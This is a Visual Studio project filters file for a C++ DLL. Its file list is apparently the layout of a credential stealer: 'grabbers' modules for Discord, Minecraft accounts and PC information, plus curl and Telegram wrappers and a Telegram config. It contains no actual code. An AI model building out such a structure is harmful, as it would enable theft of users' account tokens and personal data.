<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Source Files\config">
      <UniqueIdentifier>{4440448e-146c-410a-9959-837ceb67e2e1}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\wrappers">
      <UniqueIdentifier>{6e9c6fbf-7c34-4e20-b351-d39e4e3faa24}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\grabbers">
      <UniqueIdentifier>{0184aad3-8b6b-4969-8445-8dcc7fc9d85a}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="framework.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="init.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="wrappers\curl.h">
      <Filter>Source Files\wrappers</Filter>
    </ClInclude>
    <ClInclude Include="config\telegram.h">
      <Filter>Source Files\config</Filter>
    </ClInclude>
    <ClInclude Include="utils.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="wrappers\telegram.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="grabbers\discord.h">
      <Filter>Source Files\grabbers</Filter>
    </ClInclude>
    <ClInclude Include="grabbers\getinfopc.h">
      <Filter>Source Files\grabbers</Filter>
    </ClInclude>
    <ClInclude Include="grabbers\minecraft.h">
      <Filter>Source Files\grabbers</Filter>
    </ClInclude>
    <ClInclude Include="debug.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="grabbers\minecraftacc.h">
      <Filter>Source Files\grabbers</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="dllmain.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="pch.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="init.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="wrappers\curl.cpp">
      <Filter>Source Files\wrappers</Filter>
    </ClCompile>
    <ClCompile Include="utils.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="wrappers\telegram.cpp">
      <Filter>Source Files\wrappers</Filter>
    </ClCompile>
    <ClCompile Include="grabbers\discord.cpp">
      <Filter>Source Files\grabbers</Filter>
    </ClCompile>
    <ClCompile Include="grabbers\getinfopc.cpp">
      <Filter>Source Files\grabbers</Filter>
    </ClCompile>
    <ClCompile Include="grabbers\minecraft.cpp">
      <Filter>Source Files\grabbers</Filter>
    </ClCompile>
    <ClCompile Include="debug.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="grabbers\minecraftacc.cpp">
      <Filter>Source Files\grabbers</Filter>
    </ClCompile>
  </ItemGroup>
</Project>